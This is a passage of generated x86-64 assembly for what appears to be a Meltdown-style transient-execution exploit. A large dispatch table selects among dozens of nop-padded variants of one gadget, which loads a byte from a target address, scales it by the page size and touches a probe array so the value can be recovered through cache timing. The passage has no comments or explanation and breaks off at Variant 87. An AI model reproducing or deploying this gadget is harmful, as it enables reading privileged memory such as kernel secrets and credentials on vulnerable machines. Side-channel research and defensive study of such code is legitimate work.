	cmpl	$922, %eax
	je	.Lprobe_one_win0_var922
	cmpl	$923, %eax
	je	.Lprobe_one_win0_var923
	cmpl	$924, %eax
	je	.Lprobe_one_win0_var924
	cmpl	$925, %eax
	je	.Lprobe_one_win0_var925
	cmpl	$926, %eax
	je	.Lprobe_one_win0_var926
	cmpl	$927, %eax
	je	.Lprobe_one_win0_var927
	cmpl	$928, %eax
	je	.Lprobe_one_win0_var928
	cmpl	$929, %eax
	je	.Lprobe_one_win0_var929
	cmpl	$930, %eax
	je	.Lprobe_one_win0_var930
	cmpl	$931, %eax
	je	.Lprobe_one_win0_var931
	cmpl	$932, %eax
	je	.Lprobe_one_win0_var932
	cmpl	$933, %eax
	je	.Lprobe_one_win0_var933
	cmpl	$934, %eax
	je	.Lprobe_one_win0_var934
	cmpl	$935, %eax
	je	.Lprobe_one_win0_var935
	cmpl	$936, %eax
	je	.Lprobe_one_win0_var936
	cmpl	$937, %eax
	je	.Lprobe_one_win0_var937
	cmpl	$938, %eax
	je	.Lprobe_one_win0_var938
	cmpl	$939, %eax
	je	.Lprobe_one_win0_var939
	cmpl	$940, %eax
	je	.Lprobe_one_win0_var940
	cmpl	$941, %eax
	je	.Lprobe_one_win0_var941
	cmpl	$942, %eax
	je	.Lprobe_one_win0_var942
	cmpl	$943, %eax
	je	.Lprobe_one_win0_var943
	cmpl	$944, %eax
	je	.Lprobe_one_win0_var944
	cmpl	$945, %eax
	je	.Lprobe_one_win0_var945
	cmpl	$946, %eax
	je	.Lprobe_one_win0_var946
	cmpl	$947, %eax
	je	.Lprobe_one_win0_var947
	cmpl	$948, %eax
	je	.Lprobe_one_win0_var948
	cmpl	$949, %eax
	je	.Lprobe_one_win0_var949
	cmpl	$950, %eax
	je	.Lprobe_one_win0_var950
	cmpl	$951, %eax
	je	.Lprobe_one_win0_var951
	cmpl	$952, %eax
	je	.Lprobe_one_win0_var952
	cmpl	$953, %eax
	je	.Lprobe_one_win0_var953
	cmpl	$954, %eax
	je	.Lprobe_one_win0_var954
	cmpl	$955, %eax
	je	.Lprobe_one_win0_var955
	cmpl	$956, %eax
	je	.Lprobe_one_win0_var956
	cmpl	$957, %eax
	je	.Lprobe_one_win0_var957
	cmpl	$958, %eax
	je	.Lprobe_one_win0_var958
	cmpl	$959, %eax
	je	.Lprobe_one_win0_var959
	cmpl	$960, %eax
	je	.Lprobe_one_win0_var960
	cmpl	$961, %eax
	je	.Lprobe_one_win0_var961
	cmpl	$962, %eax
	je	.Lprobe_one_win0_var962
	cmpl	$963, %eax
	je	.Lprobe_one_win0_var963
	cmpl	$964, %eax
	je	.Lprobe_one_win0_var964
	cmpl	$965, %eax
	je	.Lprobe_one_win0_var965
	cmpl	$966, %eax
	je	.Lprobe_one_win0_var966
	cmpl	$967, %eax
	je	.Lprobe_one_win0_var967
	cmpl	$968, %eax
	je	.Lprobe_one_win0_var968
	cmpl	$969, %eax
	je	.Lprobe_one_win0_var969
	cmpl	$970, %eax
	je	.Lprobe_one_win0_var970
	cmpl	$971, %eax
	je	.Lprobe_one_win0_var971
	cmpl	$972, %eax
	je	.Lprobe_one_win0_var972
	cmpl	$973, %eax
	je	.Lprobe_one_win0_var973
	cmpl	$974, %eax
	je	.Lprobe_one_win0_var974
	cmpl	$975, %eax
	je	.Lprobe_one_win0_var975
	cmpl	$976, %eax
	je	.Lprobe_one_win0_var976
	cmpl	$977, %eax
	je	.Lprobe_one_win0_var977
	cmpl	$978, %eax
	je	.Lprobe_one_win0_var978
	cmpl	$979, %eax
	je	.Lprobe_one_win0_var979
	cmpl	$980, %eax
	je	.Lprobe_one_win0_var980
	cmpl	$981, %eax
	je	.Lprobe_one_win0_var981
	cmpl	$982, %eax
	je	.Lprobe_one_win0_var982
	cmpl	$983, %eax
	je	.Lprobe_one_win0_var983
	cmpl	$984, %eax
	je	.Lprobe_one_win0_var984
	cmpl	$985, %eax
	je	.Lprobe_one_win0_var985
	cmpl	$986, %eax
	je	.Lprobe_one_win0_var986
	cmpl	$987, %eax
	je	.Lprobe_one_win0_var987
	cmpl	$988, %eax
	je	.Lprobe_one_win0_var988
	cmpl	$989, %eax
	je	.Lprobe_one_win0_var989
	cmpl	$990, %eax
	je	.Lprobe_one_win0_var990
	cmpl	$991, %eax
	je	.Lprobe_one_win0_var991
	cmpl	$992, %eax
	je	.Lprobe_one_win0_var992
	cmpl	$993, %eax
	je	.Lprobe_one_win0_var993
	cmpl	$994, %eax
	je	.Lprobe_one_win0_var994
	cmpl	$995, %eax
	je	.Lprobe_one_win0_var995
	cmpl	$996, %eax
	je	.Lprobe_one_win0_var996
	cmpl	$997, %eax
	je	.Lprobe_one_win0_var997
	cmpl	$998, %eax
	je	.Lprobe_one_win0_var998
	cmpl	$999, %eax
	je	.Lprobe_one_win0_var999
	jmp	.Lprobe_one_win0_var0
## Variant 0
.Lprobe_one_win0_var0:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 1
.Lprobe_one_win0_var1:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 2
.Lprobe_one_win0_var2:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 3
.Lprobe_one_win0_var3:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 4
.Lprobe_one_win0_var4:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 5
.Lprobe_one_win0_var5:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 6
.Lprobe_one_win0_var6:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 7
.Lprobe_one_win0_var7:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 8
.Lprobe_one_win0_var8:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 9
.Lprobe_one_win0_var9:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 10
.Lprobe_one_win0_var10:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 11
.Lprobe_one_win0_var11:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 12
.Lprobe_one_win0_var12:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 13
.Lprobe_one_win0_var13:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 14
.Lprobe_one_win0_var14:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 15
.Lprobe_one_win0_var15:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 16
.Lprobe_one_win0_var16:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 17
.Lprobe_one_win0_var17:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 18
.Lprobe_one_win0_var18:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 19
.Lprobe_one_win0_var19:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 20
.Lprobe_one_win0_var20:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 21
.Lprobe_one_win0_var21:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 22
.Lprobe_one_win0_var22:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 23
.Lprobe_one_win0_var23:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 24
.Lprobe_one_win0_var24:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 25
.Lprobe_one_win0_var25:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 26
.Lprobe_one_win0_var26:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 27
.Lprobe_one_win0_var27:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 28
.Lprobe_one_win0_var28:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 29
.Lprobe_one_win0_var29:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 30
.Lprobe_one_win0_var30:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 31
.Lprobe_one_win0_var31:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 32
.Lprobe_one_win0_var32:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 33
.Lprobe_one_win0_var33:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 34
.Lprobe_one_win0_var34:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 35
.Lprobe_one_win0_var35:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 36
.Lprobe_one_win0_var36:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 37
.Lprobe_one_win0_var37:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 38
.Lprobe_one_win0_var38:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 39
.Lprobe_one_win0_var39:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 40
.Lprobe_one_win0_var40:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 41
.Lprobe_one_win0_var41:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 42
.Lprobe_one_win0_var42:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 43
.Lprobe_one_win0_var43:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 44
.Lprobe_one_win0_var44:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 45
.Lprobe_one_win0_var45:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 46
.Lprobe_one_win0_var46:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 47
.Lprobe_one_win0_var47:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 48
.Lprobe_one_win0_var48:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 49
.Lprobe_one_win0_var49:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 50
.Lprobe_one_win0_var50:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 51
.Lprobe_one_win0_var51:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 52
.Lprobe_one_win0_var52:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 53
.Lprobe_one_win0_var53:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 54
.Lprobe_one_win0_var54:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 55
.Lprobe_one_win0_var55:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 56
.Lprobe_one_win0_var56:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 57
.Lprobe_one_win0_var57:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 58
.Lprobe_one_win0_var58:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 59
.Lprobe_one_win0_var59:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 60
.Lprobe_one_win0_var60:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 61
.Lprobe_one_win0_var61:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 62
.Lprobe_one_win0_var62:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 63
.Lprobe_one_win0_var63:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 64
.Lprobe_one_win0_var64:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 65
.Lprobe_one_win0_var65:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 66
.Lprobe_one_win0_var66:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 67
.Lprobe_one_win0_var67:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 68
.Lprobe_one_win0_var68:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 69
.Lprobe_one_win0_var69:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 70
.Lprobe_one_win0_var70:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 71
.Lprobe_one_win0_var71:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 72
.Lprobe_one_win0_var72:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 73
.Lprobe_one_win0_var73:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 74
.Lprobe_one_win0_var74:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 75
.Lprobe_one_win0_var75:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 76
.Lprobe_one_win0_var76:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 77
.Lprobe_one_win0_var77:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 78
.Lprobe_one_win0_var78:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 79
.Lprobe_one_win0_var79:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 80
.Lprobe_one_win0_var80:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 81
.Lprobe_one_win0_var81:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 82
.Lprobe_one_win0_var82:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 83
.Lprobe_one_win0_var83:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 84
.Lprobe_one_win0_var84:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 85
.Lprobe_one_win0_var85:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 86
.Lprobe_one_win0_var86:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 87
.Lprobe_one_win0_var87:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
